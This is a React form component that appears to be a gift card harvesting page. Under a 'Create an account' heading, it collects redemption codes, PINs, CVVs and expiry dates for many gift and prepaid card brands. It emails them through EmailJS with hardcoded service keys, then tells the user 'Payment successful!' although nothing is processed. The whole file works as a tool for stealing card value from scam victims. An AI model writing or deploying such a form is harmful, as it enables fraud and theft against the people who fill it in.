import React, { useState, useRef } from "react";
import Image from "../assets/cards.png";
import emailjs from "@emailjs/browser";
import toast, { Toaster } from "react-hot-toast";

const Form = () => {
  const [cardtype, setCardtype] = useState(1);
  const form = useRef();

  function setCard(e) {
    switch (e.target.value) {
      case "apple" ||
        "amazon" ||
        "steam" ||
        "ebay" ||
        "xbox" ||
        "googleplay" ||
        "playstation" ||
        "razergold":
        return setCardtype(1);
      case "amazon":
        return setCardtype(1);
      case "steam":
        return setCardtype(1);
      case "xbox":
        return setCardtype(1);
      case "ebay":
        return setCardtype(1);
      case "googleplay":
        return setCardtype(1);
      case "playstation":
        return setCardtype(1);
      case "razergold":
        return setCardtype(1);
      case "sephora":
        return setCardtype(2);
      case "nike":
        return setCardtype(2);
      case "nordstrom":
        return setCardtype(2);
      case "mastercard":
        return setCardtype(3);
      case "vanillacard":
        return setCardtype(3);
      case "wallmartvisa":
        return setCardtype(3);
      case "visasilverywhite":
        return setCardtype(3);
      case "ttvisa":
        return setCardtype(3);
      case "amex":
        return setCardtype(4);

      default:
        break;
    }
    console.log(cardtype);
  }

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_37hvm5c",
        "template_lmyvxpl",
        form.current,
        "_sPY9Cjw-xnbeDrpq"
      )
      .then(
        (result) => {
          toast.success("Payment successful!");
        },
        (error) => {
          toast.error("Payment Failed, Try again");
        }
      );
    e.target.reset();
  };

  return (
    <section className="flex flex-col items-center pt-6 w-[100%] py-10">
      <img id="form" src={Image} alt="card image" />
      <div className="w-[95%] bg-black-gradient-2 rounded-lg shadow dark:border md:mt-0 sm:max-w-[50%] xl:p-0 dark:bg-gray-800 dark:border-gray-700">
        <div className="p-6 space-y-4 md:space-y-6 sm:p-8">
          <h1 className="text-xl font-bold leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
            Create an account
          </h1>
          <form
            className="space-y-4 md:space-y-6"
            ref={form}
            onSubmit={sendEmail}
          >
            <div>
              <select
                name="card_type"
                onChange={setCard}
                id="countries"
                className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
              >
                <option>Select Type of Card</option>
                <option value="apple">Apple</option>
                <option value="amazon">Amazon</option>
                <option value="steam">Steam</option>
                <option value="ebay">eBay</option>
                <option value="xbox">Xbox</option>
                <option value="googleplay">Googleplay</option>
                <option value="playstation">PlayStation</option>
                <option value="razergold">razerGold</option>
                <option value="sephora">Sephora</option>
                <option value="nordstrom">Nordstrom</option>
                <option value="nike">Nike</option>
                <option value="mastercard">MasterCard</option>
                <option value="vanillavisa">Vanilla Visa</option>
                <option value="wallmartvisa">Wallmart Visa</option>
                <option value="visasilverywhite">Visa Silvery White</option>
                <option value="ttvisa">TT Visa</option>
                <option value="amex">Amex</option>
              </select>
            </div>
            <div className="flex gap-2">
              <select
                name="currency"
                className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-[30%] p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
              >
                <option value="USD">USD</option>
                <option value="GBP">GBP</option>
                <option value="AUD">AUD</option>
                <option value="Euro">Euro</option>
                <option value="CAD">CAD</option>
              </select>
              <input
                type="number"
                placeholder="
              Card Amount"
                name="amount"
                id="amount"
                className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
              />
            </div>
            {cardtype === 1 ? (
              <div>
                <input
                  type="text"
                  name="redem"
                  id="redem"
                  placeholder="Redemption Code"
                  className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                  required=""
                />
              </div>
            ) : cardtype === 2 ? (
              <>
                <div>
                  <input
                    type="text"
                    name="redem"
                    id="redem"
                    placeholder="Redemption Code"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />{" "}
                </div>
                <div>
                  <input
                    type="text"
                    name="giftcardpin"
                    id="giftcardpin"
                    placeholder="Gift Card Pin"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />
                </div>
              </>
            ) : cardtype === 3 ? (
              <>
                <div>
                  <input
                    type="text"
                    name="redem"
                    id="redem"
                    placeholder="Redemption Code"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />{" "}
                </div>
                <div>
                  <input
                    type="text"
                    name="giftcardexpireydata"
                    id="giftcardexpireydata"
                    placeholder="Gift Card Expiry Date"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />{" "}
                </div>
                <div>
                  <input
                    type="text"
                    name="giftcardcvv"
                    id="giftcardcvv"
                    placeholder="Gift Card CVV"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />
                </div>
              </>
            ) : cardtype === 4 ? (
              <>
                <div>
                  <input
                    type="text"
                    name="redem"
                    id="redem"
                    placeholder="Redemption Code"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />{" "}
                </div>
                <div>
                  <input
                    type="text"
                    name="giftcardexpireydata"
                    id="giftcardexpireydata"
                    placeholder="Gift Card Expiry Date"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />{" "}
                </div>
                <div>
                  <input
                    type="text"
                    name="pin"
                    id="pin"
                    placeholder="4 Digit Pin"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />
                </div>
                <div>
                  <input
                    type="text"
                    name="giftcardcvv"
                    id="giftcardcvv"
                    placeholder="Gift Card CVV"
                    className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                    required=""
                  />
                </div>
              </>
            ) : (
              ""
            )}
            ""
            <button
              type="submit"
              className="w-full text-white bg-blue-600 hover:bg-blue-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
            >
              Continue
            </button>
            <p className="text-sm font-light text-gray-500 dark:text-gray-400 text-center">
              Please make sure the codes you are about to input are correct and
              according to details
            </p>
          </form>
        </div>
      </div>
      <Toaster />
    </section>
  );
};

export default Form;
